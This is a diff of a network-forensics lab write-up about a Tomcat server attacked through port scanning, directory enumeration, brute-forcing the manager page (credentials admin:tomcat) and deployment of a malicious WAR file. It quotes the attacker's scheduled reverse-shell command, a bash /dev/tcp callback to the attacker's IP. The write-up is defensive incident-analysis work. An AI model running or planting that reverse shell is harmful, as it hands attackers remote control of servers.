@@ -4,12 +4,13 @@ The SOC team has identified suspicious activity on a web server within the compa
 
 - **Category**: Network Forensics
 - **Tools**: Wireshark, IP Location
+
 ## Overview
-(Conclude your report with a summary of the main finding of you analysis --> 5 Ws: Who, What, When, Where, Why)
 
 The system recorded that at about `01:18 - 01:24` in `09-11-2023`, the attacker `14.0.0.120` from `Guangdong - China` attack the `Tomcat` web server `10.0.0.120` by process scan, brute-force, upload malicious and persistent attack. 
 
 For more detail, the attacker used tool for scaning port on the server and he chooes port `8080` for attacking. Then he used `gobuster` to scan hidden assets and found admin page of web server. Then he brute-forced the admin page and found the credential `admin:tomcat`. After accessing, attacker deploy a malicious file `JXQOZY.war` - a type of compressed file that Apache Tomcat server can run it automatically into a web application. This web application connects to attacker and helps them execute command in shell in the web server. Attacker add a  schedule backdoor `bash -i >& /dev/tcp/14.0.0.120/443 0>&1` that connect back to the attacker machine through port `443` every 60s.
+
 # Analysis
 
 I were provided a `web server.pcap` that contain `21 070` packets from `01:13:06` to `01:27:37` in `2023-09-11`. And the file has SH256 value:
@@ -116,6 +117,7 @@ After attack phase by `14.0.0.120`, the host `10.0.0.115` connected agains to we
   <img src="./Assets/Image 11 - Admin check the server.webp" alt="Admin check the server" /> <br />
   <em>Image 11: Admin check the server</em>
 </p>
+
 # Answer the Questions
 
 **Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?**
